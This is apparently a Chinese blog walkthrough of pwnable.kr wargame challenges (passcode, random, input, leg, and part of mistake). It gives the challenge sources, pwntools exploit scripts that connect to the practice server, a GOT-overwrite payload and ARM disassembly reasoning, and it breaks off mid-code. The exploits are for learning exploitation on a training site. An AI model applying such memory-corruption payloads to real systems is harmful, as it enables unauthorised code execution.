+<p>而name数组最多填充到0xffffce7c，所以passcode2我们是覆盖不到的，这个时候可以通过劫持GOT表，因为我们可以填充passcode1的地址，再进行scanf相当于一个任意地址写，所以我们可以将一个函数的GOT地址内容改为system(“/bin/cat flag”);的地址<br><img src="https://raw.githubusercontent.com/HackPluto/bokepicture/master/bokeimg/截屏2020-03-11下午11.56.14.png" alt><br>最终我们选择的是flush函数<br>EXP：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = ssh(<span class="string">'passcode'</span>, <span class="string">'pwnable.kr'</span>, <span class="number">2222</span>, <span class="string">'guest'</span>)</span><br><span class="line">p = s.process(<span class="string">'./passcode'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Sendline</span><span class="params">(s)</span>:</span></span><br><span class="line">    p.sendline(s)</span><br><span class="line">    <span class="keyword">print</span> s</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p.read(),</span><br><span class="line">exp_buf = <span class="string">'a'</span> * <span class="number">96</span> + <span class="string">'\x18\xa0\x04\x08'</span></span><br><span class="line">Sendline(exp_buf)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p.read(),</span><br><span class="line">payload = str(<span class="number">0x080485e3</span>)</span><br><span class="line">Sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p.read(),</span><br><span class="line">Sendline(<span class="string">'1234'</span>)</span><br><span class="line"></span><br><span class="line">recv = p.readall()</span><br><span class="line">recv = recv.replace(<span class="string">'\xa0'</span>, <span class="string">''</span>)</span><br><span class="line"><span class="keyword">print</span> recv</span><br></pre></td></tr></table></figure></p>
+<h2 id="random"><a href="#random" class="headerlink" title="random"></a>random</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> random;</span><br><span class="line">	random = rand();	<span class="comment">// random value!</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> key=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;key);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>( (key ^ random) == <span class="number">0xdeadbeef</span> )&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Good!\n"</span>);</span><br><span class="line">		system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Wrong, maybe you should try 2^32 cases.\n"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里介绍一下Linux的random函数<br>random函数需要设置一个种子函数，如果种子函数一样每次的随机数都是一样的，这个题的没有设置种子函数所以我们在本地运行这个程序会得到一样的随机数<br><img src="https://raw.githubusercontent.com/HackPluto/bokepicture/master/bokeimg/20200312010519.png" alt><br>直接按照题目意思编写脚本<br>EXP：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = ssh(<span class="string">'random'</span>, <span class="string">'pwnable.kr'</span>, <span class="number">2222</span>, <span class="string">'guest'</span>)</span><br><span class="line">p = s.process(<span class="string">'./random'</span>)</span><br><span class="line"></span><br><span class="line">a =  int(<span class="number">0xdeadbeef</span> ^ <span class="number">0x6b8b4567</span>)</span><br><span class="line">p.sendline(str(a))</span><br><span class="line">flag = p.recv()</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure></p>
+<h2 id="input"><a href="#input" class="headerlink" title="input"></a>input</h2><p>源码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Welcome to pwnable.kr\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Let's see if you know how to give input to program\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Just give me correct inputs then you will get the flag :)\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// argv</span></span><br><span class="line">	<span class="keyword">if</span>(argc != <span class="number">100</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">'A'</span>],<span class="string">"\x00"</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">'B'</span>],<span class="string">"\x20\x0a\x0d"</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Stage 1 clear!\n"</span>);	</span><br><span class="line"></span><br><span class="line">	<span class="comment">// stdio</span></span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">4</span>];</span><br><span class="line">	read(<span class="number">0</span>, buf, <span class="number">4</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">"\x00\x0a\x00\xff"</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	read(<span class="number">2</span>, buf, <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">"\x00\x0a\x02\xff"</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Stage 2 clear!\n"</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// env</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">strcmp</span>(<span class="string">"\xca\xfe\xba\xbe"</span>, getenv(<span class="string">"\xde\xad\xbe\xef"</span>))) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Stage 3 clear!\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// file</span></span><br><span class="line">	FILE* fp = fopen(<span class="string">"\x0a"</span>, <span class="string">"r"</span>);</span><br><span class="line">	<span class="keyword">if</span>(!fp) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>( fread(buf, <span class="number">4</span>, <span class="number">1</span>, fp)!=<span class="number">1</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>( <span class="built_in">memcmp</span>(buf, <span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>) ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	fclose(fp);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Stage 4 clear!\n"</span>);	</span><br><span class="line"></span><br><span class="line">	<span class="comment">// network</span></span><br><span class="line">	<span class="keyword">int</span> sd, cd;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">saddr</span>, <span class="title">caddr</span>;</span></span><br><span class="line">	sd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span>(sd == <span class="number">-1</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"socket error, tell admin\n"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	saddr.sin_family = AF_INET;</span><br><span class="line">	saddr.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">	saddr.sin_port = htons( atoi(argv[<span class="string">'C'</span>]) );</span><br><span class="line">	<span class="keyword">if</span>(bind(sd, (struct sockaddr*)&amp;saddr, <span class="keyword">sizeof</span>(saddr)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"bind error, use another port\n"</span>);</span><br><span class="line">    		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	listen(sd, <span class="number">1</span>);</span><br><span class="line">	<span class="keyword">int</span> c = <span class="keyword">sizeof</span>(struct sockaddr_in);</span><br><span class="line">	cd = accept(sd, (struct sockaddr *)&amp;caddr, (<span class="keyword">socklen_t</span>*)&amp;c);</span><br><span class="line">	<span class="keyword">if</span>(cd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"accept error, tell admin\n"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>( recv(cd, buf, <span class="number">4</span>, <span class="number">0</span>) != <span class="number">4</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">"\xde\xad\xbe\xef"</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Stage 5 clear!\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// here's your flag</span></span><br><span class="line">	system(<span class="string">"/bin/cat flag"</span>);	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="argv"><a href="#argv" class="headerlink" title="argv"></a>argv</h3><p>第一个输入是关于argv的输入，argv就是程序在命令行的程序参数，可以直接编写相应的脚本</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#argv</span></span><br><span class="line">argv = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">	argv.append(<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line">argv[<span class="number">0</span>] = <span class="string">"/home/input2/input"</span></span><br><span class="line">argv[<span class="string">'A'</span>] = <span class="string">"\x00"</span></span><br><span class="line">argv[<span class="string">'B'</span>] = <span class="string">"\x20\x0a\x0d"</span></span><br></pre></td></tr></table></figure>
+<h3 id="stdio"><a href="#stdio" class="headerlink" title="stdio"></a>stdio</h3><p>stdio就是Linux的标准输入输出，这里需要解释一下read函数的参数，第一个参数是0代表从标准输入就是键盘输入，2的话代表从stderr输入<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'print "\x00\x0a\x00\xff"'</span> &gt; /tmp/lulz/stdin</span><br><span class="line">python -c <span class="string">'print "\x00\x0a\x02\xff"'</span> &gt; /tmp/lulz/stderr</span><br></pre></td></tr></table></figure></p>
+<h3 id="env"><a href="#env" class="headerlink" title="env"></a>env</h3><p>getenv()就是C获取linux系统环境变量的方法，所以这个地方我们只要给进程添加相应的环境变量即可</p>
+<h3 id="file"><a href="#file" class="headerlink" title="file"></a>file</h3><p>创建对应的文件，写入内容即可<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'fd = open("/tmp/lulz/"+"\x0a", "w"); fd.write("\x00\x00\x00\x00"); fd.close()'</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="network"><a href="#network" class="headerlink" title="network"></a>network</h3><h2 id="leg"><a href="#leg" class="headerlink" title="leg"></a>leg</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">key1</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">asm</span>(<span class="string">"mov r3, pc\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">key2</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">asm</span>(</span><br><span class="line">	<span class="string">"push	&#123;r6&#125;\n"</span></span><br><span class="line">	<span class="string">"add	r6, pc, $1\n"</span></span><br><span class="line">	<span class="string">"bx	r6\n"</span></span><br><span class="line">	<span class="string">".code   16\n"</span></span><br><span class="line">	<span class="string">"mov	r3, pc\n"</span></span><br><span class="line">	<span class="string">"add	r3, $0x4\n"</span></span><br><span class="line">	<span class="string">"push	&#123;r3&#125;\n"</span></span><br><span class="line">	<span class="string">"pop	&#123;pc&#125;\n"</span></span><br><span class="line">	<span class="string">".code	32\n"</span></span><br><span class="line">	<span class="string">"pop	&#123;r6&#125;\n"</span></span><br><span class="line">	);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">key3</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">asm</span>(<span class="string">"mov r3, lr\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> key=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Daddy has very strong arm! : "</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;key);</span><br><span class="line">	<span class="keyword">if</span>( (key1()+key2()+key3()) == key )&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Congratz!\n"</span>);</span><br><span class="line">		<span class="keyword">int</span> fd = open(<span class="string">"flag"</span>, O_RDONLY);</span><br><span class="line">		<span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">		<span class="keyword">int</span> r = read(fd, buf, <span class="number">100</span>);</span><br><span class="line">		write(<span class="number">0</span>, buf, r);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"I have strong leg :P\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>看了源码后知道这个题与汇编有关<br>这个题目中说了和ARM有关<br>这前我也没有学过ARM，所以花了半个小时通过这个<a href="http://blog.leanote.com/post/tarena/ARM%E6%B1%87%E7%BC%96%E5%85%A5%E9%97%A8" target="_blank" rel="noopener">教程</a>入门了下，和X86很多相似的地方，做这个题够了<br>这个题就是将三个函数的返回值相加再比较<br>ARM中函数返回值在R0寄存器中</p>
+<figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disass key1</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="built_in">function</span> key1:</span><br><span class="line">    <span class="number">0</span>x00008cd4 &lt;+<span class="number">0</span>&gt;:	push	&#123;r11&#125;		; (str r11, [sp, #-<span class="number">4</span>]!)</span><br><span class="line">    <span class="number">0</span>x00008cd8 &lt;+<span class="number">4</span>&gt;:	add	r11, sp, #<span class="number">0</span></span><br><span class="line">    <span class="number">0</span>x00008cdc &lt;+<span class="number">8</span>&gt;:	mov	r3, pc</span><br><span class="line">    <span class="number">0</span>x00008ce0 &lt;+<span class="number">12</span>&gt;:	mov	r0, r3</span><br><span class="line">    <span class="number">0</span>x00008ce4 &lt;+<span class="number">16</span>&gt;:	sub	sp, r11, #<span class="number">0</span></span><br><span class="line">    <span class="number">0</span>x00008ce8 &lt;+<span class="number">20</span>&gt;:	pop	&#123;r11&#125;		; (ldr r11, [sp], #<span class="number">4</span>)</span><br><span class="line">    <span class="number">0</span>x00008cec &lt;+<span class="number">24</span>&gt;:	bx	lr</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
+<p>R0 = R3 = PC<br>在ARM模式下，PC会提前预取两条指令所以执行<br>mov    r3, pc 时PC为 0x00008cdc + 8 = 0x00008ce4<br>R0 = 0x00008ce4<br><figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disass key2</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="built_in">function</span> key2:</span><br><span class="line">    <span class="number">0</span>x00008cf0 &lt;+<span class="number">0</span>&gt;:	push	&#123;r11&#125;		; (str r11, [sp, #-<span class="number">4</span>]!)</span><br><span class="line">    <span class="number">0</span>x00008cf4 &lt;+<span class="number">4</span>&gt;:	add	r11, sp, #<span class="number">0</span></span><br><span class="line">    <span class="number">0</span>x00008cf8 &lt;+<span class="number">8</span>&gt;:	push	&#123;r6&#125;		; (str r6, [sp, #-<span class="number">4</span>]!)</span><br><span class="line">    <span class="number">0</span>x00008cfc &lt;+<span class="number">12</span>&gt;:	add	r6, pc, #<span class="number">1</span></span><br><span class="line">    <span class="number">0</span>x00008d00 &lt;+<span class="number">16</span>&gt;:	bx	r6</span><br><span class="line">    <span class="number">0</span>x00008d04 &lt;+<span class="number">20</span>&gt;:	mov	r3, pc</span><br><span class="line">    <span class="number">0</span>x00008d06 &lt;+<span class="number">22</span>&gt;:	adds	r3, #<span class="number">4</span></span><br><span class="line">    <span class="number">0</span>x00008d08 &lt;+<span class="number">24</span>&gt;:	push	&#123;r3&#125;</span><br><span class="line">    <span class="number">0</span>x00008d0a &lt;+<span class="number">26</span>&gt;:	pop	&#123;pc&#125;</span><br><span class="line">    <span class="number">0</span>x00008d0c &lt;+<span class="number">28</span>&gt;:	pop	&#123;r6&#125;		; (ldr r6, [sp], #<span class="number">4</span>)</span><br><span class="line">    <span class="number">0</span>x00008d10 &lt;+<span class="number">32</span>&gt;:	mov	r0, r3</span><br><span class="line">    <span class="number">0</span>x00008d14 &lt;+<span class="number">36</span>&gt;:	sub	sp, r11, #<span class="number">0</span></span><br><span class="line">    <span class="number">0</span>x00008d18 &lt;+<span class="number">40</span>&gt;:	pop	&#123;r11&#125;		; (ldr r11, [sp], #<span class="number">4</span>)</span><br><span class="line">    <span class="number">0</span>x00008d1c &lt;+<span class="number">44</span>&gt;:	bx	lr</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure></p>
+<p>add    r6, pc, #1 R6 = PC + 1 = 0x00008cfc + 8 + 1 = 0x00008d01<br>bx    r6 bx指令用于切换处理器状态模式，最低位为1时，切换到Thumb指令执行，为0时，解释为ARM指令执行。所以这个地方程序会切换成Thumb模式</p>
+<h3 id="Thumb"><a href="#Thumb" class="headerlink" title="Thumb"></a>Thumb</h3><p>Thumb 指令可以看作是 ARM 指令压缩形式的子集,是针对代码密度的问题而提出的,它具有 16 位的代码密度但是它不如ARM指令的效率高 .Thumb 不是一个完整的体系结构,不能指望处理只执行Thumb 指令而不支持 ARM 指令集.因此,Thumb 指令只需要支持通用功能,必要时可以借助于完善的 ARM 指令集。每次PC只预取一条指令</p>
+<p>mov    r3, pc 后 R3 = 0x00008d04 + 4 = 0x00008d08<br>adds    r3, #4 R3 = R3 + 4 = 0x00008d0c<br>mov    r0, r3<br>R0 = 0x00008d0c<br><figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disass key3</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="built_in">function</span> key3:</span><br><span class="line">    <span class="number">0</span>x00008d20 &lt;+<span class="number">0</span>&gt;:	push	&#123;r11&#125;		; (str r11, [sp, #-<span class="number">4</span>]!)</span><br><span class="line">    <span class="number">0</span>x00008d24 &lt;+<span class="number">4</span>&gt;:	add	r11, sp, #<span class="number">0</span></span><br><span class="line">    <span class="number">0</span>x00008d28 &lt;+<span class="number">8</span>&gt;:	mov	r3, lr</span><br><span class="line">    <span class="number">0</span>x00008d2c &lt;+<span class="number">12</span>&gt;:	mov	r0, r3</span><br><span class="line">    <span class="number">0</span>x00008d30 &lt;+<span class="number">16</span>&gt;:	sub	sp, r11, #<span class="number">0</span></span><br><span class="line">    <span class="number">0</span>x00008d34 &lt;+<span class="number">20</span>&gt;:	pop	&#123;r11&#125;		; (ldr r11, [sp], #<span class="number">4</span>)</span><br><span class="line">    <span class="number">0</span>x00008d38 &lt;+<span class="number">24</span>&gt;:	bx	lr</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure></p>
+<p>mov    r3, lr LR寄存器：连接寄存器r14（LR）：每种模式下r14都有自身版组，当程序正常时保存子程序返回地址 所以这个地方保存的是main函数的下一跳指令的地址 在main函数中可以找到如下指令<br><figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>x00008d7c &lt;+<span class="number">64</span>&gt;:	bl	<span class="number">0</span>x8d20 &lt;key3&gt;</span><br><span class="line"><span class="number">0</span>x00008d80 &lt;+<span class="number">68</span>&gt;:	mov	r3, r0</span><br></pre></td></tr></table></figure></p>
+<p>R0 = R3 = LR = 0x00008d80<br>key = 108400</p>
+<h2 id="mistake"><a href="#mistake" class="headerlink" title="mistake"></a>mistake</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PW_LEN 10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> XORKEY 1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xor</span><span class="params">(<span class="keyword">char</span>* s, <span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;len; i++)&#123;</span><br><span class="line">		s[i] ^= XORKEY;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">int</span> fd;</span><br><span class="line">	<span class="keyword">if</span>(fd=open(<span class="string">"/home/mistake/password"</span>,O_RDONLY,<span class="number">0400</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"can't open password %d\n"</span>, fd);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"do not bruteforce...\n"</span>);</span><br><span class="line">	sleep(time(<span class="number">0</span>)%<span class="number">20</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> pw_buf[PW_LEN+<span class="number">1</span>];</span><br><span class="line">	